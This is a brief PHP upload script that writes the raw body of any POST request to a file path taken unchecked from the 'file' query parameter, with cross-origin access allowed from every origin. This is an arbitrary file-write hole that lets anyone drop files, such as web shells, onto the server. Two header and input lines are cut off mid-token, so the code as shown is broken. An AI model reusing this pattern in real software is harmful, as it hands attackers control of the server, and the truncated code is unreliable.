<!-- from jayden -->

<?php

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, A$

$fileName = $_GET['file'];

if ( !isset( $HTTP_RAW_POST_DATA ) ) $HTTP_RAW_POST_DATA =file_get_contents( 'p$

$fp = fopen( $fileName, 'wb' );
fwrite( $fp, $GLOBALS[ 'HTTP_RAW_POST_DATA' ] );
fclose( $fp );

?>
